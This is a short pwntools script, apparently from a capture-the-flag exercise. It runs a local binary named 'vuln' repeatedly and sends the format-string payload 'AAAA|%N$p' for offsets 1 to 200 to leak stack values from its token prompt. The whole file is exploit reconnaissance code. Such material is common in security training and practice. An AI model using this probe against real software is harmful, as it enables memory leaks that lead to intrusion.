from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'error'

for i in range(1, 201):
    try:
        p = process()

        p.sendline(b"1")
        p.sendlineafter(b'token?\n', "AAAA|%{}$p".format(i).encode())
        p.recvuntil('token:\n')
        resp = p.recvline().decode().strip()
        print(str(i) + ': ' + resp)

        p.close()

    except EOFError:
        pass
